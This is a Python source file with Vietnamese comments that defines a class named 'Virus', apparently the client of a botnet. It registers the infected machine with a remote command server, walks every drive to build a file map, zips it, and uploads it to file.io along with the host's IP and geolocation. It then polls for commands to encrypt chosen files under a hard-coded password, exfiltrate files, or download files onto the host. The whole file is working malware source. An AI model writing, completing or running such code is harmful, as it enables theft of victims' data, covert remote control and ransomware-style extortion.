import requests,json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import string
import random
from time import sleep
import socket
import psutil,shutil
class Virus:
    def __init__(self,length=20) -> None:
        self.url_mock = ""  # Thay "1" bằng ID của danh sách cần sửa
        self.headers = {
            "Authorization": "",
            "Content-Type": "application/json"
        }
        api_key = ""
        self.headers_savekey = {
            'Authorization': f'Bearer {api_key}'
        }
        

        try:
            with open('token.json', 'r') as f:
                self.token = json.load(f)['token']
            
        except:
            print('chưa có token')
            characters = string.ascii_letters + string.digits
            # Tạo một chuỗi ngẫu nhiên với độ dài mong muốn
            self.token = ''.join(random.choice(characters) for _ in range(length))
            with open('token.json', 'w') as f:
                json.dump({'token': self.token}, f)
            
            new_bot = {
                "name": self.get_machine_name(),
                "token": self.token
            }

            # Lấy dữ liệu hiện tại
            post_response = requests.post(self.url_mock, headers=self.headers, json=new_bot)
            update_bots = requests.get('https://botnet-server.vercel.app/api/update_bots')
            print(update_bots.json())
            self.save_drive_info_separately()
            
        self.url = f'/api/{self.token}/data'
        self.url_post = f'/api/{self.token}'
        self.upload_url = f"/api/{self.token}/upload"  # Thay <bot_token> bằng token thật
        self.file_url = f'/api/{self.token}/files'
        self.result = f'/result'
        
    # # Hàm để lấy tên máy
    def get_public_ip(self):
        """Lấy địa chỉ IP công cộng (WAN)"""
        try:
            response = requests.get("https://api.ipify.org?format=json")
            public_ip = response.json()["ip"]
            return public_ip
        except requests.RequestException as e:
            return f"Không thể lấy IP công cộng: {e}"

    def get_geolocation(self):
        ip = self.get_public_ip()
        """Lấy thông tin khu vực từ IP"""
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            if response.status_code == 200:
                data = response.json()
                return {
                    "IP": ip,
                    "City": data.get("city", "Không rõ"),
                    "Area": data.get("region", "Không rõ"),
                    "Country": data.get("country", "Không rõ"),
                    "Location": data.get("loc", "Không rõ"),
                    "Network_provider": data.get("org", "Không rõ")
                }
            else:
                return f"Lỗi khi lấy thông tin khu vực: {response.status_code}"
        except requests.RequestException as e:
            return f"Không thể lấy thông tin khu vực: {e}"
    def get_machine_name(self):
        return socket.gethostname()

    # Hàm để liệt kê tất cả các file và thư mục theo cấu trúc phân cấp
    def list_files_and_folders(self,path):
        def traverse_directory(directory):
            # Trả về một cấu trúc phân cấp cho thư mục
            dir_data = {
                "name": os.path.basename(directory),
                "path": directory,
                "folders": [],
                "files": []
            }

            # Duyệt qua các thư mục và tệp tin trong thư mục hiện tại
            for root, dirs, files in os.walk(directory):
                # Liệt kê các thư mục con
                for dir_name in dirs:
                    sub_dir_path = os.path.join(root, dir_name)
                    sub_dir_data = traverse_directory(sub_dir_path)  # Đệ quy vào thư mục con
                    dir_data["folders"].append(sub_dir_data)

                # Liệt kê các tệp tin
                for file_name in files:
                    dir_data["files"].append(os.path.join(root, file_name))
                
                # Chỉ duyệt một lần, sau đó kết thúc
                break
            
            return dir_data

        # Bắt đầu từ thư mục gốc
        return traverse_directory(path)

    # Hàm chính để lưu dữ liệu ổ đĩa vào các file JSON riêng
    def save_drive_info_separately(self):
        # Lấy tên máy
        machine_name = self.get_machine_name()
        

        # Tạo folder theo tên máy
        output_folder = machine_name
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)

        # Lấy danh sách tất cả ổ đĩa
        for partition in psutil.disk_partitions():
            drive_name = partition.device.strip(":\\")
            mountpoint = partition.mountpoint

            # Kiểm tra xem ổ đĩa có tồn tại và truy cập được không
            if os.path.exists(mountpoint):
                # Lấy cấu trúc thư mục và tệp tin trong ổ
                drive_structure = self.list_files_and_folders(mountpoint)

                # Tạo dữ liệu JSON cho ổ đĩa
                drive_data = {
                    "drive": partition.device,
                    "mountpoint": partition.mountpoint,
                    "file_system": partition.fstype,
                    "structure": drive_structure
                }

                # Lưu dữ liệu vào file JSON
                json_file_path = os.path.join(output_folder, f"{drive_name}.json")
                with open(json_file_path, "w", encoding="utf-8") as json_file:
                    json.dump(drive_data, json_file, indent=4)

                print(f"Đã lưu thông tin ổ đĩa '{drive_name}' vào file: {json_file_path}")
        zip_file_name = f"{machine_name}.zip"
        shutil.make_archive(base_name=machine_name, format="zip", root_dir=output_folder)
        with open(f"{machine_name}.zip", 'rb') as file:
            response_linkSave = requests.post('https://file.io', files={'file': file}, headers=self.headers_savekey).json()
            data_server = f"{response_linkSave['link'].split('https://file.io/')[1]}"

        data_newdevice = self.get_geolocation()
        data_newdevice['name_device'] = machine_name
        data_newdevice['token'] = self.token
        data_newdevice['token_file'] = data_server
        print(data_newdevice)
        self.new_deviceurl = f"/api/newdevice"
        response = requests.post(self.new_deviceurl, json=data_newdevice).json()
        print(response)
            # token_bot = response['download_token']
    # Gọi hàm chính để lưu thông tin
    def generate_key(self,password: str, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # Sử dụng 256 bit cho AES
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return kdf.derive(password.encode())
    
    def send_result(self,status,data):
        if data['type_control'] == 'download':
            data = {
                "id_SQL": data["id"],
                "status_SQL": status,
                "type_control": data['type_control'],
                "data_file": self.data_tokenfiles,
            }
        elif data['type_control'] == 'upload':
            data = {
                "id_SQL": data["id"],
                "status_SQL": status,
                "type_control": data['type_control'],
            }
        elif data['type_control'] == 'createFileControl':
            data = {
                "id_SQL": data["id"],
                "status_SQL": status,
                "type_control": data['type_control'],
            }
        
        response = requests.post(self.result, json=data)
        print(response.json())
    
    def encode(self,data: str, password: str):
        data_files = data['file']
        # Đọc tệp tin
        
        # Sinh salt ngẫu nhiên và tạo khóa từ mật khẩu 
        salt = os.urandom(16)
        key = self.generate_key(password, salt)
        try:
            for data_file in data_files:
                print(data_file)
                file_path = data_file['path']
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                # Tạo IV (Initialization Vector) ngẫu nhiên cho AES
                iv = os.urandom(16)
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

                # Tạo bộ padding để đảm bảo kích thước của dữ liệu là bội số của block size
                padder = padding.PKCS7(algorithms.AES.block_size).padder()
                padded_data = padder.update(file_data) + padder.finalize()

                # Mã hóa dữ liệu
                encryptor = cipher.encryptor()
                encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

                # Lưu lại tệp tin đã mã hóa với tên mới
                with open(file_path + ".enc", 'wb') as enc_file:
                    enc_file.write(salt + iv + encrypted_data)

                # print(f"File '{file_path}' đã được mã hóa và lưu thành '{file_path}.enc'.")
            return 'success'
        except :
            return 'error'
        
    def upload(self,data: str):
        data_files = data['file']
        print(data_files)
        self.data_tokenfiles = []
        for data_file in data_files:
            file_path = data_file['path']  # Đường dẫn tới file muốn upload

             # Đọc file và gửi yêu cầu upload
            with open(file_path, 'rb') as file:
                response_linkSave = requests.post('https://file.io', files={'file': file}, headers=self.headers_savekey).json()
                # files_server = {'file':  file}
                self.token_file = response_linkSave['link'].split('https://file.io/')[1]
                self.data_tokenfiles.append({'token_file': self.token_file,'id_file': data_file['id']})
            # Xử lý phản hồi từ server
           
        return 'success'

    def download_file(self,data: str):
        print('shinsad')
        # response = requests.get(self.file_url).json()
        # print(response)
        for data_file in data['file']:
            download_url = f"https://www.file.io/download/{data_file['token_file']}"  # Thay <download_token> bằng token thật
            name_file = f"{data_file['fileName']}" 

            # Gửi yêu cầu tải file
            response = requests.get(download_url)

            # Xử lý phản hồi từ server
            if response.status_code == 200:
                # Lưu file tải về
                with open(f'{data['upload_path']}/{name_file}', 'wb') as file:
                    file.write(response.content)
            else:
                print(f"Failed to download file. Status code: {response.status_code}, Response: {response.text}")
        return 'success'
        
    def post_status(self,status):
        data = {
            'status': status
        }
        response = requests.post(self.url_post, json=data)
        if response.status_code == 200:
            print(response.json())
        else:
            print(f"{response.status_code}: {response.text}")
    def main(self):
        while True:
            try:
                response = requests.get(self.url).json()
                data_action = response['data']
   
                for data in data_action:
                    # print(data)
                    if data['status'] == 'is being done':
                        if data['type_control'] == 'encrypted':
                            status = self.encode(data,'botnetbyshinsad') 
                            self.send_result(status, data)
                        elif data['type_control'] == 'download':
                            status = self.upload(data)
                            self.send_result(status, data)
                        elif data['type_control'] == 'createFileControl':
                            status = self.download_file(data)
                            self.send_result(status, data)
            except:
                # pass
                sleep(20)
        # print(data_action)
Virus().main()
